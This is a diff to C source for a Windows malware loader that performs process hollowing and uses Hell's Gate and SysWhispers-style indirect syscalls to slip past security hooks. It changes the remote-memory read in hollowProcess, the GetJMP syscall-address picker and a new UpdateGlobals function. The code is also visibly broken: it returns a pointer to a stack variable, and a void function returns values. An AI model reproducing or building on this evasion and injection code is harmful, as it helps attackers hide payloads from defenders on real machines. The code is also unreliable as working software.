@@ -1,7 +1,8 @@
+#include <stdio.h>
+#include <stdint.h>
+#include <Windows.h>
 #include "typedef.h"
 #include "Syswhispers.h"
-#include <Windows.h>
-#include <stdio.h>
 #include "assembly.h"
 
 //Hells Gate Additions
@@ -177,7 +178,8 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     //getchar();
 
     //BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
-    BOOL result = NoahRead(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    //BOOL result = NoahRead(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    BOOL result = NoahRead2(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
     printf("Enging NoahRead\n");
 
     printf("Proc Address: 0x%p", procAddr);
@@ -607,18 +609,51 @@ EXTERN_C DWORD GetSSN(DWORD input){
     return (DWORD)VxTable.Read.wSystemCall;
 }
 
-EXTERN_C QWORD GetJMP() {
+
+//NOTE TO SELF FOR YOU NOAH - JUNE 2ND - THIS FUNCTION IS THE ISSUE RN...
+EXTERN_C PVOID* GetJMP() {
     printf("Now would be a good time to check rax for the syscall value...\n");
     getchar();
-    PVOID address = pSystemCalls[((DWORD)rand()) % sizeof(pSystemCalls)];
+
+    //static uint64_t value =(uint64_t
+   
+    uint64_t address = pSystemCalls[((DWORD)rand()) % sizeof(pSystemCalls)];
     //PVOID address = (PVOID)(0xdeadbeef);
     printf("Getting JMP! 0x%p\n", address);
     gJMP = address;
+    uint64_t address2 = (uint64_t)address;
     getchar();
-    // return address;
-    return address;
+     //return &address2;
+    return &address2;
+    //return &value;
 }
-    
+EXTERN_C void UpdateGlobals(DWORD input) {
+    uint64_t address = pSystemCalls[((DWORD)rand()) % sizeof(pSystemCalls)];
+    //PVOID address = (PVOID)(0xdeadbeef);
+    printf("Getting JMP! 0x%p\n", address);
+    gJMP = address;
+    uint64_t address2 = (uint64_t)address;
+    getchar();
+    printf("Input val to UpdateGloabls: %d\n", input);
+    getchar();
+
+    if (input == 0) {
+        printf("Wow! Read Syscall Getter called: %d\n", VxTable.Read.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.Read.wSystemCall;
+        getchar();
+        return (DWORD)VxTable.Read.wSystemCall;
+    }
+    else if (input == 1) {
+        return VxTable.Write.wSystemCall;
+    }
+    else if (input == 2) {
+        return VxTable.Allocate.wSystemCall;
+    }
+    return (DWORD)VxTable.Read.wSystemCall;
+
+
+}
 
 
 int main() {
